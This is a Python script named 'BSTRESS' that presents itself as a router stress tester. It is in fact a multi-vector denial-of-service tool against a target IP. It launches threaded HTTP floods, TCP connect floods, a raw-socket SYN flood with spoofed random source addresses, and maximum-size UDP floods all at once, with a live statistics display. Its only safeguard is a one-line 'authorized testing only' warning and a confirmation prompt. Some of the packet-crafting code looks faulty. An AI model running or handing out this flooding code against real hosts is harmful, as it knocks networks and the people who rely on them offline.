import threading
import socket
import requests
import time
import psutil
import random
from collections import defaultdict
import argparse

class NetworkMonitor:
    def __init__(self):
        self.last_update = time.time()
        self.last_sent = 0
        self.last_recv = 0
        self.current_sent = 0
        self.current_recv = 0
        self.max_bandwidth = self._get_max_bandwidth()
        
    def _get_max_bandwidth(self):
        """Get maximum bandwidth in bytes/second"""
        try:
            # Get speed of primary interface (convert Mbps to bytes/s)
            stats = psutil.net_if_stats()
            if stats:
                return stats[list(stats.keys())[0]].speed * 125000  # 1 Mbps = 125,000 bytes/s
        except:
            pass
        return 0  # Fallback if can't detect
    
    def update(self):
        """Update current network usage"""
        now = time.time()
        elapsed = now - self.last_update
        if elapsed < 0.2:  # Don't update too frequently
            return
            
        net_io = psutil.net_io_counters()
        self.current_sent = (net_io.bytes_sent - self.last_sent) / elapsed
        self.current_recv = (net_io.bytes_recv - self.last_recv) / elapsed
        
        self.last_sent = net_io.bytes_sent
        self.last_recv = net_io.bytes_recv
        self.last_update = now
        
    def get_usage(self):
        """Get current bandwidth usage as percentage"""
        if self.max_bandwidth <= 0:
            return 0, 0  # Couldn't determine max bandwidth
            
        sent_pct = min(100, (self.current_sent / self.max_bandwidth) * 100)
        recv_pct = min(100, (self.current_recv / self.max_bandwidth) * 100)
        return sent_pct, recv_pct

class RouterStressTester:
    def __init__(self, target_ip, threads_per_attack=10):
        self.target_ip = target_ip
        self.threads_per_attack = threads_per_attack
        self.lock = threading.Lock()
        self.stop_flag = False
        self.net_monitor = NetworkMonitor()
        self.stats = defaultdict(int)
        self.stats.update({
            'start_time': time.time(),
            'syn_raw': 0,
            'throttled': 0
        })
        self.start_net_stats = psutil.net_io_counters()

    def _check_throttle(self):
        """Check and handle network throttling"""
        self.net_monitor.update()
        sent_pct, recv_pct = self.net_monitor.get_usage()
        
        # Throttle if either upload or download exceeds 90%
        if sent_pct > 90 or recv_pct > 90:
            with self.lock:
                self.stats['throttled'] += 1
            time.sleep(0.05)
            return True
        return False

    def http_flood(self):
        """HTTP flood attack"""
        session = requests.Session()
        url = f"http://{self.target_ip}"
        while not self.stop_flag:
            if self._check_throttle():
                continue
            try:
                session.get(url, timeout=2)
                with self.lock:
                    self.stats['http'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def syn_flood(self, port=80):
        """Standard SYN flood using TCP sockets"""
        while not self.stop_flag:
            if self._check_throttle():
                continue
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((self.target_ip, port))
                    with self.lock:
                        self.stats['syn'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def syn_flood_raw(self, port=80):
        """Advanced SYN flood using raw sockets (requires root)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            def craft_syn_packet():
                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                ip_header = b'\x45\x00\x00\x3c'  # IP header
                ip_header += b'\x00\x00\x40\x00\x40\x06\x00\x00'  # More IP header
                ip_header += socket.inet_aton(src_ip)  # Source IP (randomized)
                ip_header += socket.inet_aton(self.target_ip)  # Destination IP
                
                tcp_header = b'\x00\x50'  # Source port (random)
                tcp_header += port.to_bytes(2, 'big')  # Destination port
                tcp_header += b'\x00\x00\x00\x00'  # Sequence number
                tcp_header += b'\x00\x00\x00\x00'  # Acknowledgement number
                tcp_header += b'\x50\x02\xff\xff'  # Header length + SYN flag
                tcp_header += b'\x00\x00\x00\x00'  # Window size
                
                return ip_header + tcp_header
            
            while not self.stop_flag:
                if self._check_throttle():
                    continue
                try:
                    s.sendto(craft_syn_packet(), (self.target_ip, 0))
                    with self.lock:
                        self.stats['syn_raw'] += 1
                except:
                    with self.lock:
                        self.stats['errors'] += 1
                        
        except PermissionError:
            print("[!] Raw SYN flood requires root/admin privileges. Falling back to TCP SYN.")
            self.syn_flood(port)

    def udp_flood(self, port=53):
        """Maximized UDP payload flood"""
        payload = b'X' * 65507  # Maximum UDP payload
        while not self.stop_flag:
            if self._check_throttle():
                continue
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(payload, (self.target_ip, port))
                    with self.lock:
                        self.stats['udp'] += 1
            except:
                with self.lock:
                    self.stats['errors'] += 1

    def display_stats(self):
        """Improved real-time monitoring with proper network stats"""
        while not self.stop_flag:
            time.sleep(1)
            with self.lock:
                self.net_monitor.update()
                sent_pct, recv_pct = self.net_monitor.get_usage()
                elapsed = time.time() - self.stats['start_time']
                current_net = psutil.net_io_counters()
                
                print("\033[H\033[J")  # Clear console
                print("=== BSTRESS Network Stress Tester ===")
                print(f"Target: {self.target_ip} | Runtime: {int(elapsed)}s")
                print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
                print(f"Errors: {self.stats['errors']} | Throttle Events: {self.stats['throttled']}")
                
                # Improved network display
                total_sent = (current_net.bytes_sent - self.start_net_stats.bytes_sent)/1024/1024
                total_recv = (current_net.bytes_recv - self.start_net_stats.bytes_recv)/1024/1024
                print(f"\nNetwork Usage:")
                print(f"  Current: ↑{sent_pct:.1f}% ↓{recv_pct:.1f}%")
                print(f"  Total: ↑{total_sent:.2f}MB ↓{total_recv:.2f}MB")
                print(f"\nPress CTRL+C to stop...")

    def run_test(self):
        """Start all attack threads"""
        attacks = [
            self.http_flood,
            self.syn_flood,
            self.syn_flood_raw,
            self.udp_flood
        ]
        threads = []
        
        for attack in attacks:
            for _ in range(self.threads_per_attack):
                t = threading.Thread(target=attack)
                t.daemon = True
                t.start()
                threads.append(t)

        threading.Thread(target=self.display_stats, daemon=True).start()

        try:
            while True: time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_flag = True
            print("\n[!] Stopping attack...")
            time.sleep(1)
            self._show_final_stats()

    def _show_final_stats(self):
        elapsed = time.time() - self.stats['start_time']
        total = sum(self.stats[k] for k in ['http','syn','syn_raw','udp'])
        print("\n=== FINAL REPORT ===")
        print(f"Runtime: {elapsed:.1f}s | Packets: {total}")
        print(f"HTTP: {self.stats['http']} | SYN: {self.stats['syn']} | RAW SYN: {self.stats['syn_raw']} | UDP: {self.stats['udp']}")
        print(f"Error Rate: {self.stats['errors']/total*100:.1f}%")
        print(f"Throttle Events: {self.stats['throttled']}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BSTRESS Network Load Tester")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Threads per attack type")
    args = parser.parse_args()

    print("\n[!] LEGAL WARNING: For authorized testing only!")
    confirm = input(f"Stress test {args.target} with {args.threads} threads? (y/n): ")
    if confirm.lower() == 'y':
        RouterStressTester(args.target, args.threads).run_test()